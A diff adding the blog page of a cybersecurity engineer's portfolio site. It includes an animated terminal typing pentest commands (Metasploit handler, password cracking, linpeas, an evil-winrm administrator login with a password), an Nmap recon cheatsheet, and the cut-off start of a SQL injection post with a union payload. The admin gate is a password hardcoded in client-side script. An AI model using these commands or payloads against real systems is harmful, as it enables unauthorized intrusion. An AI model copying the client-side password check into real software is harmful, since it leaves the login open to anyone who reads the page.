@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0a0a0f" />
+  <meta name="description" content="Osama Jaradat — Cybersecurity Blog. Writeups, research, and field notes on pentesting, threat analysis, and security tools." />
+  <title>Blog | Osama Jaradat</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="./style.css" />
+  <style>
+    /* ═══════════════════════════════════
+       TERMINAL WINDOW
+    ═══════════════════════════════════ */
+    .terminal-window {
+      background: #0d0d0d;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 28px 90px rgba(0, 0, 0, 0.65),
+                  0 0 0 1px rgba(255, 255, 255, 0.04),
+                  0 0 60px rgba(0, 198, 255, 0.05);
+      overflow: hidden;
+      font-family: var(--mono);
+      width: 100%;
+      max-width: 560px;
+    }
+
+    .terminal-top {
+      background: #1c1c1e;
+      padding: 1.1rem 1.6rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      user-select: none;
+    }
+
+    .term-dots {
+      display: flex;
+      gap: 7px;
+      flex-shrink: 0;
+    }
+    .term-dot {
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      cursor: default;
+    }
+    .term-dot.r { background: #ff5f57; }
+    .term-dot.y { background: #febc2e; }
+    .term-dot.g { background: #28c840; }
+
+    .term-title {
+      font-size: 1.2rem;
+      color: #666;
+      margin: 0 auto;
+      letter-spacing: 0.04em;
+    }
+
+    .terminal-body {
+      padding: 1.8rem 2rem;
+      min-height: 240px;
+      max-height: 280px;
+      overflow: hidden;
+      color: #c9d1d9;
+      font-size: 1.35rem;
+      line-height: 1.85;
+    }
+
+    .term-line {
+      display: flex;
+      gap: 0.8rem;
+      align-items: baseline;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .term-prompt { color: var(--accent); user-select: none; }
+    .term-cmd    { color: #e6e6e6; }
+
+    .term-cursor {
+      display: inline-block;
+      width: 8px;
+      height: 1.15em;
+      background: var(--accent);
+      vertical-align: text-bottom;
+      border-radius: 1px;
+      animation: termBlink 1s step-end infinite;
+      margin-left: 1px;
+    }
+
+    @keyframes termBlink {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0; }
+    }
+
+    /* ═══════════════════════════════════
+       BLOG HERO
+    ═══════════════════════════════════ */
+    .blog-hero {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .blog-hero-bg {
+      position: absolute;
+      inset: 0;
+      z-index: 0;
+    }
+
+    .blog-hero-grid {
+      width: 100%;
+      height: 100%;
+      background-image:
+        linear-gradient(rgba(0, 198, 255, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 198, 255, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      animation: gridMove 25s linear infinite;
+    }
+
+    .blog-hero-glow {
+      position: absolute;
+      top: 45%;
+      left: 50%;
+      width: 900px;
+      height: 700px;
+      background: radial-gradient(ellipse, rgba(127, 90, 240, 0.09) 0%, transparent 65%);
+      transform: translate(-50%, -50%);
+      pointer-events: none;
+      animation: glowDrift 9s ease-in-out infinite;
+    }
+
+    .blog-hero-inner {
+      position: relative;
+      z-index: 1;
+      max-width: 1160px;
+      margin: 0 auto;
+      padding: 13rem 2.4rem 8rem;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 1.1fr;
+      gap: 7rem;
+      align-items: center;
+    }
+
+    .blog-hero-text .section-label { margin-bottom: 2rem; }
+
+    .blog-hero-text h1 {
+      font-size: clamp(3.8rem, 6.5vw, 6.4rem);
+      font-weight: 700;
+      line-height: 1.06;
+      letter-spacing: -0.03em;
+      margin-bottom: 2.2rem;
+    }
+
+    .blog-hero-text p {
+      font-size: 1.7rem;
+      color: var(--text-muted);
+      line-height: 1.78;
+      max-width: 440px;
+    }
+
+    /* ═══════════════════════════════════
+       BLOG SECTION
+    ═══════════════════════════════════ */
+    .blog-section {
+      padding: 10rem 0;
+      background: var(--bg-alt);
+    }
+
+    .blog-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+      gap: 2.4rem;
+    }
+
+    /* ── Blog Card ── */
+    .blog-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      transition: border-color var(--t), background var(--t),
+                  transform var(--t), box-shadow var(--t);
+    }
+    .blog-card:hover {
+      border-color: var(--border-glow);
+      background: var(--card-hover);
+      transform: translateY(-6px);
+      box-shadow: 0 22px 56px rgba(0, 0, 0, 0.32);
+    }
+
+    .blog-card-top {
+      padding: 0.9rem 1.6rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 0, 0, 0.18);
+      flex-shrink: 0;
+    }
+    .bc-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+    }
+    .bc-dot.r { background: rgba(255, 95, 87, 0.75); }
+    .bc-dot.y { background: rgba(254, 188, 46, 0.75); }
+    .bc-dot.g { background: rgba(40, 200, 64, 0.75); }
+    .bc-file {
+      font-size: 1.1rem;
+      font-family: var(--mono);
+      color: var(--text-dim);
+      margin-left: 0.8rem;
+    }
+
+    .blog-card-body {
+      padding: 2.8rem;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 1.4rem;
+    }
+
+    .blog-meta {
+      display: flex;
+      align-items: center;
+      gap: 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    .blog-tag {
+      font-size: 1.05rem;
+      font-family: var(--mono);
+      padding: 0.3rem 1rem;
+      border-radius: 100px;
+      border: 1px solid;
+      letter-spacing: 0.02em;
+    }
+    .blog-tag.red    { color: #ff6b7a; background: rgba(255,71,87,0.1);   border-color: rgba(255,71,87,0.28); }
+    .blog-tag.cyan   { color: #00d4ff; background: rgba(0,198,255,0.1);   border-color: rgba(0,198,255,0.28); }
+    .blog-tag.green  { color: #26e0ad; background: rgba(29,209,161,0.1);  border-color: rgba(29,209,161,0.28); }
+    .blog-tag.purple { color: #9b76ff; background: rgba(127,90,240,0.1);  border-color: rgba(127,90,240,0.28); }
+    .blog-tag.orange { color: #ffb066; background: rgba(255,159,67,0.1);  border-color: rgba(255,159,67,0.28); }
+
+    .blog-date {
+      font-size: 1.15rem;
+      font-family: var(--mono);
+      color: var(--text-dim);
+    }
+
+    .blog-card h3 {
+      font-size: 1.9rem;
+      font-weight: 600;
+      line-height: 1.35;
+      color: var(--text);
+    }
+
+    .blog-card p {
+      font-size: 1.45rem;
+      color: var(--text-muted);
+      line-height: 1.78;
+      flex: 1;
+    }
+
+    .blog-read-more {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: var(--accent);
+      transition: gap var(--t);
+      margin-top: 0.4rem;
+      align-self: flex-start;
+    }
+    .blog-read-more:hover { gap: 10px; }
+    .blog-read-more.soon {
+      color: var(--text-dim);
+      cursor: default;
+      pointer-events: none;
+    }
+    .blog-read-more.soon::after {
+      content: '(coming soon)';
+      font-size: 1.05rem;
+      font-family: var(--mono);
+      opacity: 0.55;
+    }
+
+    /* ═══════════════════════════════════
+       RESPONSIVE
+    ═══════════════════════════════════ */
+    @media (max-width: 920px) {
+      .blog-hero-inner {
+        grid-template-columns: 1fr;
+        gap: 5rem;
+        padding-top: 12rem;
+      }
+      .terminal-window { max-width: 100%; }
+      .blog-hero-text p { max-width: 100%; }
+    }
+
+    @media (max-width: 600px) {
+      .blog-hero-inner { padding-top: 10rem; }
+      .blog-grid { grid-template-columns: 1fr; }
+      .terminal-body { min-height: 200px; }
+    }
+
+    /* ═══════════════════════════════════
+       ADMIN MODAL
+    ═══════════════════════════════════ */
+    .admin-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.72);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      z-index: 3000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.28s ease;
+    }
+    .admin-overlay.open {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .admin-modal {
+      background: var(--card);
+      border: 1px solid var(--border-glow);
+      border-radius: var(--radius-lg);
+      padding: 3.2rem;
+      width: 100%;
+      max-width: 490px;
+      box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(0,198,255,0.08);
+      transform: translateY(18px);
+      transition: transform 0.28s ease;
+    }
+    .admin-overlay.open .admin-modal { transform: translateY(0); }
+    .admin-modal-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 2.4rem;
+    }
+    .admin-badge {
+      font-size: 1.2rem;
+      font-family: var(--mono);
+      color: var(--accent);
+      background: var(--accent-dim);
+      border: 1px solid rgba(0,198,255,0.22);
+      padding: 0.4rem 1.2rem;
+      border-radius: 100px;
+    }
+    .admin-close {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text-muted);
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.3rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color var(--t), color var(--t), background var(--t);
+      flex-shrink: 0;
+    }
+    .admin-close:hover { border-color: #ff5f57; color: #ff5f57; background: rgba(255,95,87,0.1); }
+    .admin-step h3 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 0.8rem;
+      letter-spacing: -0.01em;
+    }
+    .admin-hint {
+      font-size: 1.3rem;
+      color: var(--text-muted);
+      font-family: var(--mono);
+      margin-bottom: 2.2rem;
+      line-height: 1.6;
+    }
+    .admin-input {
+      display: block;
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 1.4rem;
+      padding: 1.1rem 1.4rem;
+      outline: none;
+      box-sizing: border-box;
+      margin-bottom: 1.5rem;
+      transition: border-color var(--t), box-shadow var(--t);
+    }
+    .admin-input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(0,198,255,0.12);
+    }
+    .admin-input::placeholder { color: var(--text-dim); }
+    .admin-select { cursor: pointer; }
+    .admin-textarea { min-height: 96px; resize: vertical; font-family: var(--font); line-height: 1.6; }
+    .admin-body-area { min-height: 220px; resize: vertical; font-family: var(--mono); font-size: 1.25rem; line-height: 1.7; }
+    .admin-modal { max-width: 560px; }
+    .admin-error {
+      font-size: 1.25rem;
+      color: #ff6b7a;
+      font-family: var(--mono);
+      margin-top: -0.8rem;
+      margin-bottom: 1.6rem;
+      display: none;
+    }
+    .admin-error.visible { display: block; }
+    .post-form { display: flex; flex-direction: column; }
+    .form-row { display: flex; flex-direction: column; }
+    .form-row label {
+      font-size: 1.1rem;
+      font-family: var(--mono);
+      color: var(--text-muted);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+    .form-row-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.4rem;
+    }
+    .bc-delete {
+      margin-left: auto;
+      background: none;
+      border: none;
+      color: var(--text-dim);
+      cursor: pointer;
+      font-size: 1.1rem;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      line-height: 1;
+      transition: color var(--t), background var(--t);
+    }
+    .bc-delete:hover { color: #ff5f57; background: rgba(255,95,87,0.12); }
+  </style>
+</head>
+<body>
+
+  <!-- ══ NAVBAR ══ -->
+  <nav class="navbar" id="navbar">
+    <div class="nav-container">
+      <a href="./index.html" class="nav-logo">OJ<span class="accent">.</span></a>
+      <ul class="nav-links">
+        <li><a href="./index.html#about">About</a></li>
+        <li><a href="./index.html#skills">Skills</a></li>
+        <li><a href="./index.html#experience">Experience</a></li>
+        <li><a href="./index.html#certifications">Certs</a></li>
+        <li><a href="./index.html#projects">Projects</a></li>
+        <li><a href="./blog.html" class="active">Blog</a></li>
+        <li><a href="image/Osama Jaradat CV.pdf" target="_blank" class="nav-cta">Resume ↗</a></li>
+      </ul>
+      <button class="hamburger" id="hamburger" aria-label="Toggle menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="./index.html#about">About</a>
+      <a href="./index.html#skills">Skills</a>
+      <a href="./index.html#experience">Experience</a>
+      <a href="./index.html#certifications">Certifications</a>
+      <a href="./index.html#projects">Projects</a>
+      <a href="./blog.html">Blog</a>
+      <a href="image/Osama Jaradat CV.pdf" target="_blank">Resume ↗</a>
+    </div>
+  </nav>
+
+  <!-- ══ HERO ══ -->
+  <section class="blog-hero">
+    <div class="blog-hero-bg">
+      <div class="blog-hero-grid"></div>
+      <div class="blog-hero-glow"></div>
+    </div>
+    <div class="blog-hero-inner">
+
+      <!-- Text side -->
+      <div class="blog-hero-text">
+        <div class="section-label">// The Lab</div>
+        <h1>Cybersecurity<br /><span class="gradient-text">Field Notes</span></h1>
+        <p>
+          Writeups, research, and hands-on breakdowns of pentesting
+          concepts, vulnerabilities, and techniques from the field.
+        </p>
+      </div>
+
+      <!-- Terminal side -->
+      <div class="terminal-window">
+        <div class="terminal-top">
+          <div class="term-dots">
+            <span class="term-dot r"></span>
+            <span class="term-dot y"></span>
+            <span class="term-dot g"></span>
+          </div>
+          <span class="term-title">0xTh3B1g3nd14n@kali:~</span>
+        </div>
+        <div class="terminal-body" id="termBody">
+          <!-- filled by JS -->
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ══ BLOG POSTS ══ -->
+  <section class="blog-section">
+    <div class="container">
+      <div class="section-label">01 / Posts</div>
+      <h2 class="section-title">Latest <span class="gradient-text">Writeups</span></h2>
+
+      <div class="blog-grid">
+        <!-- cards rendered by JS -->
+      </div>
+    </div>
+  </section>
+
+  <!-- ══ FOOTER ══ -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-left">
+          <span class="nav-logo">OJ<span class="accent">.</span></span>
+          <p>Cybersecurity Engineer based in Jordan, Amman.<br />Open to new opportunities.</p>
+        </div>
+        <div class="footer-links">
+          <a href="https://www.linkedin.com/in/osama-jaradat" target="_blank" rel="noopener">LinkedIn</a>
+          <a href="https://github.com/Oso00Luffy" target="_blank" rel="noopener">GitHub</a>
+          <a href="http://web.whatsapp.com/send?phone=+962777112843&text=Hello" target="_blank" rel="noopener">WhatsApp</a>
+          <a href="https://www.facebook.com/Osama00luffy" target="_blank" rel="noopener">Facebook</a>
+          <a href="https://www.instagram.com/osama.143r/" target="_blank" rel="noopener">Instagram</a>
+          <a href="mailto:osama.jaradat@proton.me">Email</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>© 2026 Osama W. Jaradat. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ══ ADMIN MODAL ══ -->
+  <div class="admin-overlay" id="adminOverlay">
+    <div class="admin-modal">
+
+      <!-- Step 1: Verify identity -->
+      <div id="adminStep1">
+        <div class="admin-modal-header">
+          <span class="admin-badge">🔐 Admin Access</span>
+          <button class="admin-close" id="adminClose" aria-label="Close">✕</button>
+        </div>
+        <h3>Who are you to post here?</h3>
+        <p class="admin-hint">// Enter your identity to continue.</p>
+        <input type="password" id="adminAnswer" class="admin-input" placeholder="Your answer..." autocomplete="off" spellcheck="false" />
+        <div class="admin-error" id="adminError">// Access denied. Wrong identity.</div>
+        <button class="btn-primary" id="adminVerify" style="width:100%;justify-content:center;font-size:1.4rem;">Verify →</button>
+      </div>
+
+      <!-- Step 2: New post form -->
+      <div id="adminStep2" style="display:none">
+        <div class="admin-modal-header">
+          <span class="admin-badge">✏️ New Post</span>
+          <button class="admin-close" id="adminClose2" aria-label="Close">✕</button>
+        </div>
+        <form id="postForm" class="post-form" novalidate>
+          <div class="form-row">
+            <label for="postTitle">Title</label>
+            <input type="text" id="postTitle" class="admin-input" placeholder="e.g. Buffer Overflow Basics" required />
+          </div>
+          <div class="form-row">
+            <label for="postFilename">Filename</label>
+            <input type="text" id="postFilename" class="admin-input" placeholder="buffer-overflow.md" required spellcheck="false" />
+          </div>
+          <div class="form-row-2">
+            <div class="form-row">
+              <label for="postTag">Tag</label>
+              <select id="postTag" class="admin-input admin-select">
+                <option value="Red Team|red">Red Team</option>
+                <option value="OWASP|orange">OWASP</option>
+                <option value="Blue Team|cyan">Blue Team</option>
+                <option value="Pentesting|red">Pentesting</option>
+                <option value="Active Directory|purple">Active Directory</option>
+                <option value="Tooling|green">Tooling</option>
+                <option value="Cryptography|purple">Cryptography</option>
+                <option value="CTF|orange">CTF</option>
+                <option value="Writeup|cyan">Writeup</option>
+              </select>
+            </div>
+            <div class="form-row">
+              <label for="postDate">Date</label>
+              <input type="text" id="postDate" class="admin-input" placeholder="Mar 2026" spellcheck="false" />
+            </div>
+          </div>
+          <div class="form-row">
+            <label for="postExcerpt">Excerpt</label>
+            <textarea id="postExcerpt" class="admin-input admin-textarea" placeholder="Short description of the writeup..." required></textarea>
+          </div>
+          <div class="form-row">
+            <label for="postBody">Body <span style="opacity:.5;font-size:.88em;font-weight:400;">(Markdown &middot; YouTube links auto-embed)</span></label>
+            <textarea id="postBody" class="admin-input admin-body-area" placeholder="## Introduction
+
+Write your full writeup here...
+
+```bash
+nmap -sV target
+```
+
+Paste a YouTube URL on its own line to embed it."></textarea>
+          </div>
+          <button type="submit" class="btn-primary" style="width:100%;justify-content:center;font-size:1.4rem;margin-top:0.4rem;">Publish Post ↗</button>
+        </form>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    "use strict";
+
+    // ── Navbar scroll ──
+    const navbar = document.getElementById('navbar');
+    window.addEventListener('scroll', () => {
+      navbar.classList.toggle('scrolled', window.scrollY > 60);
+    });
+
+    // ── Hamburger ──
+    const hamburger = document.getElementById('hamburger');
+    const mobileMenu = document.getElementById('mobileMenu');
+    hamburger.addEventListener('click', () => {
+      hamburger.classList.toggle('open');
+      mobileMenu.classList.toggle('open');
+    });
+
+    // ── Scroll reveal ──
+    const reveals = document.querySelectorAll('.reveal');
+    const revealObserver = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.classList.add('visible');
+          revealObserver.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.1 });
+    reveals.forEach(r => revealObserver.observe(r));
+
+    // ── Terminal animation ──
+    const termBody = document.getElementById('termBody');
+
+    const commands = [
+      'msfconsole -q -x "use exploit/multi/handler"',
+      'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt',
+      'john --wordlist=rockyou.txt hashes.txt',
+      'enum4linux -a 10.10.10.1',
+      'python3 linpeas.sh | tee privesc.log',
+      'evil-winrm -i 10.10.10.1 -u administrator -p \'P@ssw0rd\'',
+    ];
+
+    // Delay between finishing a command and starting the next (ms)
+    const pauseAfterCmd = [950, 1100, 800, 900, 1000, 850];
+
+    let cmdIdx = 0;
+
+    function createLine() {
+      const line = document.createElement('div');
+      line.className = 'term-line';
+      line.innerHTML = `<span class="term-prompt">$</span><span class="term-cmd"></span><span class="term-cursor"></span>`;
+      termBody.appendChild(line);
+      termBody.scrollTop = termBody.scrollHeight;
+      return line;
+    }
+
+    function typeLine(line, text, done) {
+      const cmdSpan  = line.querySelector('.term-cmd');
+      const cursor   = line.querySelector('.term-cursor');
+      let i = 0;
+
+      function tick() {
+        if (i <= text.length) {
+          cmdSpan.textContent = text.slice(0, i);
+          i++;
+          setTimeout(tick, 34 + Math.random() * 28);
+        } else {
+          // Hide cursor from this line once typing is done
+          cursor.style.display = 'none';
+          done();
+        }
+      }
+      tick();
+    }
+
+    function runNext() {
+      if (cmdIdx >= commands.length) {
+        // Restart loop after pause
+        cmdIdx = 0;
+        setTimeout(() => {
+          termBody.innerHTML = '';
+          runNext();
+        }, 2800);
+        return;
+      }
+
+      const line = createLine();
+      typeLine(line, commands[cmdIdx], () => {
+        const delay = pauseAfterCmd[cmdIdx] || 800;
+        cmdIdx++;
+        setTimeout(runNext, delay);
+      });
+    }
+
+    // Boot delay
+    setTimeout(() => {
+      // Show initial cursor line before first command
+      const initLine = createLine();
+      setTimeout(() => {
+        initLine.querySelector('.term-cursor').style.display = 'none';
+        runNext();
+      }, 600);
+    }, 400);
+
+    // ══════════════════════════════════════════
+    // ADMIN / POST SYSTEM
+    // Open with Ctrl+Shift+A
+    // ══════════════════════════════════════════
+    (function () {
+      const POSTS_KEY    = 'oj_blog_posts';
+      const ADMIN_ANSWER = '0xNeta';
+      let adminUnlocked  = false;
+
+      function getPosts() {
+        try { return JSON.parse(localStorage.getItem(POSTS_KEY)) || []; }
+        catch (e) { return []; }
+      }
+      function savePosts(posts) {
+        localStorage.setItem(POSTS_KEY, JSON.stringify(posts));
+      }
+      function escapeHtml(str) {
+        return String(str)
+          .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
+          .replace(/'/g, '&#039;');
+      }
+      function toFilename(title) {
+        return title.toLowerCase()
+          .replace(/[^a-z0-9\s-]/g, '').trim()
+          .replace(/\s+/g, '-').slice(0, 50) + '.md';
+      }
+
+      function buildCard(post) {
+        var div = document.createElement('div');
+        div.className = 'blog-card reveal';
+        div.dataset.dynamic = post.id;
+        var delBtn = adminUnlocked
+          ? '<button class="bc-delete" data-id="' + escapeHtml(post.id) + '" title="Delete post">✕</button>'
+          : '';
+        div.innerHTML =
+          '<div class="blog-card-top">' +
+            '<span class="bc-dot r"></span><span class="bc-dot y"></span><span class="bc-dot g"></span>' +
+            '<span class="bc-file">' + escapeHtml(post.filename) + '</span>' +
+            delBtn +
+          '</div>' +
+          '<div class="blog-card-body">' +
+            '<div class="blog-meta">' +
+              '<span class="blog-tag ' + escapeHtml(post.tagColor) + '">' + escapeHtml(post.tag) + '</span>' +
+              '<span class="blog-date">' + escapeHtml(post.date) + '</span>' +
+            '</div>' +
+            '<h3>' + escapeHtml(post.title) + '</h3>' +
+            '<p>' + escapeHtml(post.excerpt) + '</p>' +
+            (post.body
+              ? '<a href="post.html?id=' + escapeHtml(post.id) + '" class="blog-read-more">Read More → </a>'
+              : '<span class="blog-read-more soon">Read More → </span>') +
+          '</div>';
+        if (adminUnlocked) {
+          div.querySelector('.bc-delete').addEventListener('click', function (e) {
+            e.stopPropagation();
+            if (confirm('Delete "' + post.title + '"?')) {
+              savePosts(getPosts().filter(function (p) { return p.id !== post.id; }));
+              renderDynamicPosts();
+            }
+          });
+        }
+        return div;
+      }
+
+      function renderDynamicPosts() {
+        document.querySelectorAll('.blog-card[data-dynamic]').forEach(function (el) { el.remove(); });
+        var grid = document.querySelector('.blog-grid');
+        if (!grid) return;
+        getPosts().slice().reverse().forEach(function (post) {
+          var card = buildCard(post);
+          grid.appendChild(card);
+          revealObserver.observe(card);
+        });
+      }
+
+      // ── Modal wiring ──
+      var overlay      = document.getElementById('adminOverlay');
+      var step1        = document.getElementById('adminStep1');
+      var step2        = document.getElementById('adminStep2');
+      var answerInput  = document.getElementById('adminAnswer');
+      var errorEl      = document.getElementById('adminError');
+      var titleInput   = document.getElementById('postTitle');
+      var fileInput    = document.getElementById('postFilename');
+      var tagSelect    = document.getElementById('postTag');
+      var dateInput    = document.getElementById('postDate');
+      var excerptInput = document.getElementById('postExcerpt');
+      var bodyInput    = document.getElementById('postBody');
+
+      function openAdmin() {
+        step1.style.display = '';
+        step2.style.display = 'none';
+        answerInput.value = '';
+        errorEl.classList.remove('visible');
+        overlay.classList.add('open');
+        setTimeout(function () { answerInput.focus(); }, 120);
+      }
+      function closeAdmin() { overlay.classList.remove('open'); }
+
+      document.getElementById('adminClose').addEventListener('click', closeAdmin);
+      document.getElementById('adminClose2').addEventListener('click', closeAdmin);
+      overlay.addEventListener('click', function (e) { if (e.target === overlay) closeAdmin(); });
+
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape' && overlay.classList.contains('open')) closeAdmin();
+        if (e.ctrlKey && e.shiftKey && e.key === 'A') { e.preventDefault(); openAdmin(); }
+      });
+
+      document.getElementById('adminVerify').addEventListener('click', function () {
+        if (answerInput.value.trim().toLowerCase() === ADMIN_ANSWER.toLowerCase()) {
+          adminUnlocked = true;
+          errorEl.classList.remove('visible');
+          step1.style.display = 'none';
+          step2.style.display = '';
+          var now = new Date();
+          dateInput.value = now.toLocaleString('en-US', { month: 'short' }) + ' ' + now.getFullYear();
+          setTimeout(function () { titleInput.focus(); }, 80);
+          renderDynamicPosts();
+        } else {
+          errorEl.classList.add('visible');
+          answerInput.value = '';
+          answerInput.focus();
+        }
+      });
+
+      answerInput.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter') document.getElementById('adminVerify').click();
+      });
+
+      titleInput.addEventListener('input', function () {
+        fileInput.value = toFilename(titleInput.value);
+      });
+
+      document.getElementById('postForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        var parts = tagSelect.value.split('|');
+        var post = {
+          id:       Date.now().toString(),
+          title:    titleInput.value.trim(),
+          filename: fileInput.value.trim() || toFilename(titleInput.value),
+          tag:      parts[0],
+          tagColor: parts[1] || 'cyan',
+          date:     dateInput.value.trim() || new Date().toLocaleString('en-US', { month: 'short' }) + ' ' + new Date().getFullYear(),
+          excerpt:  excerptInput.value.trim(),
+          body:     bodyInput.value.trim(),
+        };
+        if (!post.title || !post.excerpt) return;
+        var posts = getPosts();
+        posts.push(post);
+        savePosts(posts);
+        renderDynamicPosts();
+        closeAdmin();
+        titleInput.value    = '';
+        fileInput.value     = '';
+        excerptInput.value  = '';
+        bodyInput.value     = '';
+      });
+
+      // ── Seed default posts if not yet seeded ──
+      var SEED_KEY = 'oj_blog_seeded_v1';
+      function seedDefaultPosts() {
+        if (localStorage.getItem(SEED_KEY)) return;
+        var defaults = [
+          {
+            id: 'seed-1', title: 'Nmap Cheatsheet — Recon Like a Pro',
+            filename: 'nmap-recon.md', tag: 'Red Team', tagColor: 'red',
+            date: 'Jan 2026',
+            excerpt: 'A practical reference of the most useful Nmap scans, scripts, and timing options for penetration testing engagements. From initial ping sweeps to OS fingerprinting and NSE automation.',
+            body: `## What is Nmap?
+
+Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. Mastering it is a core skill for any penetration tester.
+
+## Host Discovery
+
+\`\`\`bash
+# Ping sweep — identify live hosts
+nmap -sn 192.168.1.0/24
+
+# Skip host discovery — treat all as online
+nmap -Pn 10.10.10.1
+
+# ARP scan (faster on LAN)
+nmap -PR 192.168.1.0/24
+\`\`\`
+
+## Port Scan Types
+
+| Flag | Scan Type | Notes |
+|------|-----------|-------|
+| \`-sS\` | SYN Stealth | Default, requires root |
+| \`-sT\` | TCP Connect | No root needed |
+| \`-sU\` | UDP Scan | Slow but critical |
+| \`-sN\` | Null Scan | Firewall evasion |
+| \`-sF\` | FIN Scan | Evasion technique |
+| \`-sX\` | Xmas Scan | All flags set |
+
+## Service & Version Detection
+
+\`\`\`bash
+# Version detection
+nmap -sV 10.10.10.1
+
+# Aggressive scan — OS + version + scripts + traceroute
+nmap -A 10.10.10.1
+
+# OS fingerprinting only
+nmap -O 10.10.10.1
+\`\`\`
+
+## NSE Scripts
+
+NSE (Nmap Scripting Engine) massively extends Nmap's capabilities.
+
+\`\`\`bash
+# Default scripts
+nmap -sC 10.10.10.1
+
+# Single script
+nmap --script=http-title 10.10.10.1
+
+# All vulnerability scripts
+nmap --script=vuln 10.10.10.1
+
+# SMB enumeration
+nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.10.1
+\`\`\`
+
+:::tip Pro Tip
+Combine \`-sV -sC\` for the most useful initial scan. Add \`-oA output\` to save all formats at once.
+:::
+
+## Timing Templates
+
+\`\`\`bash
+nmap -T0  # Paranoid — IDS evasion
+nmap -T1  # Sneaky
+nmap -T3  # Normal (default)
+nmap -T4  # Aggressive — recommended for CTFs
+nmap -T5  # Insane — may miss ports on slow targets
+\`\`\`
+
+## Output Formats
+
+\`\`\`bash
+nmap -oN output.txt     # Normal text
+nmap -oX output.xml     # XML (Metasploit, etc.)
+nmap -oG output.gnmap   # Grepable
+nmap -oA output         # All three at once
+\`\`\`
+
+## My Go-To First Scan
+
+\`\`\`bash
+nmap -sV -sC -T4 -oA initial <target>
+\`\`\`
+
+Follow up with a full port scan:
+
+\`\`\`bash
+nmap -p- -T4 --min-rate 5000 -oA fullports <target>
+\`\`\`
+
+:::warn Warning
+Always obtain written authorization before scanning any target. Unauthorized scanning is illegal in most jurisdictions.
+:::`,
+          },
+          {
+            id: 'seed-2', title: 'SQL Injection: From Theory to Exploitation',
+            filename: 'sqli-explained.md', tag: 'OWASP', tagColor: 'orange',
+            date: 'Feb 2026',
+            excerpt: 'Deep dive into union-based, blind, and time-based SQL injection techniques. Includes real-world payloads, SQLMap usage, and prevention best practices aligned with OWASP Top 10.',
+            body: `## What is SQL Injection?
+
+SQL Injection (SQLi) occurs when user input is unsafely embedded in SQL queries, letting attackers manipulate database logic. It ranks consistently in the **OWASP Top 10** and remains one of the most critical web vulnerabilities.
+
+## Types of SQLi
+
+| Type | When to Use | Payload Example |
+|------|-------------|----------------|
+| Union-based | Error/output visible | \`' UNION SELECT null,user()-- -\` |
